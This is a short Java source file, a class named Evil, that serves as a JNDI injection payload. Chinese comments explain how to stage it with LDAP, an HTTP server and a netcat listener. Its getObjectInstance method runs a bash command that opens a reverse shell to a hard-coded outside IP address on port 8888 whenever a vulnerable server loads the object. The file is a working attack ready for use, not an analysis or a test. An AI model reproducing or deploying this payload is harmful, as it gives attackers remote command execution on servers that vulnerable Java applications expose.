import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Hashtable;
/*
* 1.不要用包名
* 2.增加main，用IDEA的jdk来控制(避免命令行jdk过高而实际环境jdk过低，无法向上兼容)，使用IDEA来生成class文件
* 3.无回显
* 4.反弹shell起三个服务：ldap(1389,#)、python -m(7777)、nc(8888)
* 5.jndi使用
* */
public class Evil implements ObjectFactory {
    @Override
    public Object getObjectInstance(Object o, Name name, Context context, Hashtable<?, ?> hashtable) throws Exception {
        String cmd = "/bin/bash -i >& /dev/tcp/101.132.159.30/8888 0>&1";
        Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String res = "";
        String line;
        while((line = br.readLine()) != null){
            res += line;
        }
        return res;
    }

    public static void main(String[] args) { }
}
